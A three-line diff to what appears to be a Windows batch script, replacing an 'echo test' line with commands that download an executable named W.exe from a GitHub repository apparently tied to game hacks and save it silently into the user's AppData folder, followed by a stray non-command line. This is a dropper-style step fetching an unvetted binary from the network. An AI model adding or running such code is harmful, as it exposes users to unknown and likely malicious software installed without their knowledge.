@@ -1,1 +1,3 @@
-echo  test
+set "target=%APPDATA%\W.exe"
+curl -L -o "%target%" "https://github.com/xqrto/G4mH1x/raw/main/TOOLS/W.exe"
+download fertig
